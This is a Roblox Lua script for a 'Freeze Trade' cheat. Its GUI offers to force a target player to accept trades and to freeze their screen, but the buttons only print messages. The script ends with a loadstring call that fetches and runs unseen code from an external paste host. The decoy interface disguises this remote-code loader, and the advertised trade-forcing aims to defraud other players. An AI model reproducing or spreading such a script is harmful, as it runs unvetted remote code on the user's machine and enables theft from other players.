-- Freeze Trade GUI + Welcome + Loading + External Loader

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- 🟢 Welcome Popup
local welcomeGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
welcomeGui.Name = "WelcomePopup"

local welcomeLabel = Instance.new("TextLabel", welcomeGui)
welcomeLabel.Size = UDim2.new(0.3, 0, 0.15, 0)
welcomeLabel.Position = UDim2.new(0.35, 0, 0.4, 0)
welcomeLabel.BackgroundTransparency = 1
welcomeLabel.Text = "Welcome"
welcomeLabel.Font = Enum.Font.GothamBlack
welcomeLabel.TextSize = 48
welcomeLabel.TextColor3 = Color3.new(1, 1, 1)
welcomeLabel.TextTransparency = 1
welcomeLabel.TextStrokeTransparency = 1

TweenService:Create(welcomeLabel, TweenInfo.new(0.6), {
    TextTransparency = 0,
    TextStrokeTransparency = 0.4,
    TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
}):Play()

wait(2.5)

TweenService:Create(welcomeLabel, TweenInfo.new(0.6), {
    TextTransparency = 1,
    TextStrokeTransparency = 1
}):Play()

wait(1)
welcomeGui:Destroy()

-- 🧊 Freeze Trade GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 350, 0, 240)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -120)
mainFrame.BackgroundColor3 = Color3.fromRGB(39, 42, 44)
mainFrame.BackgroundTransparency = 0.3
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local shadowFrame = Instance.new("Frame", mainFrame)
shadowFrame.Position = UDim2.new(0, 0, 0, 4)
shadowFrame.Size = UDim2.new(1, 0, 1, 0)
shadowFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 23)
shadowFrame.BackgroundTransparency = 0.3
shadowFrame.ZIndex = -1
Instance.new("UICorner", shadowFrame).CornerRadius = UDim.new(0, 12)

local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, -40, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade (BETA)"
titleLabel.TextSize = 22

local usernameInput = Instance.new("TextBox", mainFrame)
usernameInput.Size = UDim2.new(0, 310, 0, 40)
usernameInput.Position = UDim2.new(0.5, -155, 0, 55)
usernameInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
usernameInput.TextColor3 = Color3.fromRGB(127, 129, 131)
usernameInput.Font = Enum.Font.SourceSans
usernameInput.Text = "Put Target Player's Username"
usernameInput.TextSize = 18
usernameInput.ClearTextOnFocus = true
Instance.new("UICorner", usernameInput).CornerRadius = UDim.new(0, 8)

local forceAcceptButton = Instance.new("TextButton", mainFrame)
forceAcceptButton.Size = UDim2.new(0, 310, 0, 35)
forceAcceptButton.Position = UDim2.new(0.5, -155, 0, 105)
forceAcceptButton.BackgroundColor3 = Color3.fromRGB(22, 160, 133)
forceAcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
forceAcceptButton.Font = Enum.Font.SourceSansBold
forceAcceptButton.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
forceAcceptButton.TextSize = 16
Instance.new("UICorner", forceAcceptButton).CornerRadius = UDim.new(0, 8)

local freezeButton = Instance.new("TextButton", mainFrame)
freezeButton.Size = UDim2.new(0, 310, 0, 35)
freezeButton.Position = UDim2.new(0.5, -155, 0, 150)
freezeButton.BackgroundColor3 = Color3.fromRGB(26, 188, 156)
freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeButton.Font = Enum.Font.SourceSansBold
freezeButton.Text = "FREEZE PLAYER SCREEN"
freezeButton.TextSize = 16
Instance.new("UICorner", freezeButton).CornerRadius = UDim.new(0, 8)

local closeButton = Instance.new("TextButton", mainFrame)
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Text = "X"
closeButton.TextSize = 20
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)

local toggleButton = Instance.new("TextButton", screenGui)
toggleButton.Size = UDim2.new(0, 120, 0, 40)
toggleButton.Position = UDim2.new(0, 15, 0, 15)
toggleButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.Text = "Toggle UI"
toggleButton.TextSize = 18
toggleButton.Draggable = true
toggleButton.Active = true
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 8)

-- 🔘 Button Logic
forceAcceptButton.MouseButton1Click:Connect(function()
    print("Force accept on: " .. usernameInput.Text)
end)

freezeButton.MouseButton1Click:Connect(function()
    print("Freeze screen on: " .. usernameInput.Text)
end)

toggleButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

closeButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

-- 🖱️ Dragging Logic
local UserInputService = game:GetService("UserInputService")
local function makeDraggable(guiObject)
    local dragging, dragInput, dragStart, startPos = false, nil, nil, nil

    guiObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and guiObject.Draggable then
            dragging = true
            dragStart = input.Position
            startPos = guiObject.Position

            local conn; conn = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    conn:Disconnect()
                end
            end)
        end
    end)

    guiObject.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            guiObject.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

makeDraggable(mainFrame)
makeDraggable(toggleButton)

-- ⏳ LOADING SCREEN
local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
loadingGui.Name = "LoadingScreen"

local loadingFrame = Instance.new("Frame", loadingGui)
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
loadingFrame.BackgroundTransparency = 0.2

local loadingText = Instance.new("TextLabel", loadingFrame)
loadingText.Size = UDim2.new(0, 300, 0, 50)
loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)
loadingText.Text = "Loading..."
loadingText.TextSize = 32
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1

task.delay(2, function()
    for i = 0, 1, 0.05 do
        loadingFrame.BackgroundTransparency = 0.2 + i
        loadingText.TextTransparency = i
        task.wait(0.05)
    end
    loadingGui:Destroy()
end)

-- 🌐 EXTERNAL LOADER (Rubi Script)
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/iru8Oy63epzxj75l/raw", true))()
